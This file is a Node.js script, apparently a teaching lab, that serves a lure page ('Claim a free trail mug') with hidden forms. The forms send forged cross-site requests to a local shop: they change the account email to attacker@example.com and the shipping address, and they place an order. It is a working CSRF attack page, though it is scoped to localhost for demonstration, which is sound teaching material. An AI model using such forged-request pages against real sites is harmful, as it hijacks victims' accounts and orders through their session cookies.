const http = require("http");

const PORT = 3001;
const HOST = "127.0.0.1";
const TARGET = "http://localhost:3000";

// This page is a different site from the shop (127.0.0.1 vs localhost).
// It only submits to the local lab. It is not a general-purpose exploit tool.
const page = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Trail Rewards</title>
  <style>
    :root { color-scheme: light; }
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background: #10261c;
      color: #f3f7f2;
    }
    main { max-width: 640px; margin: 0 auto; padding: 48px 20px 80px; }
    .flag {
      display: inline-block;
      background: #d7f25a;
      color: #17210b;
      font-weight: 700;
      letter-spacing: 0.04em;
      text-transform: uppercase;
      font-size: 12px;
      padding: 4px 8px;
    }
    h1 { font-size: 42px; line-height: 1.05; margin: 16px 0; }
    p { font-size: 18px; line-height: 1.5; color: #d5e4d6; }
    button {
      background: #d7f25a;
      color: #17210b;
      border: 0;
      font: inherit;
      font-weight: 700;
      padding: 12px 18px;
      cursor: pointer;
    }
    .row { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 28px; }
    .fine { margin-top: 36px; font-size: 14px; color: #9bb5a4; }
    code { color: #fff; }
  </style>
</head>
<body>
  <main>
    <span class="flag">Different website</span>
    <h1>Claim a free trail mug.</h1>
    <p>This page is served from <code>127.0.0.1:${PORT}</code>. The shop is <code>localhost:3000</code>. Those are different sites, and this page is not logged into anything.</p>
    <p>Use the buttons below only after you have opened Harbor Supply in this same browser. Each button sends a forged request that carries the shop cookie.</p>
    <div class="row">
      <form method="POST" action="${TARGET}/account/update">
        <input type="hidden" name="name" value="Redirected recipient">
        <input type="hidden" name="email" value="attacker@example.com">
        <input type="hidden" name="address" value="1 Forged Lane, Dock 4">
        <button type="submit">Forge account update (POST)</button>
      </form>
      <form method="GET" action="${TARGET}/account/update">
        <input type="hidden" name="name" value="Redirected recipient">
        <input type="hidden" name="email" value="attacker@example.com">
        <input type="hidden" name="address" value="1 Forged Lane, Dock 4">
        <button type="submit">Forge account update (GET)</button>
      </form>
      <form method="POST" action="${TARGET}/order">
        <input type="hidden" name="sku" value="lantern">
        <button type="submit">Forge a lantern order (POST)</button>
      </form>
    </div>
    <p class="fine">After a forged update, the shop account page should show the new receipt email and list this site as the request origin. Close this lab when you are done testing.</p>
  </main>
</body>
</html>`;

const server = http.createServer((req, res) => {
  res.writeHead(200, {
    "Content-Type": "text/html; charset=utf-8",
    "Cache-Control": "no-store",
    "X-Content-Type-Options": "nosniff",
  });
  res.end(page);
});

server.listen(PORT, HOST, () => {
  console.log(`Attacker page                    http://${HOST}:${PORT}`);
});
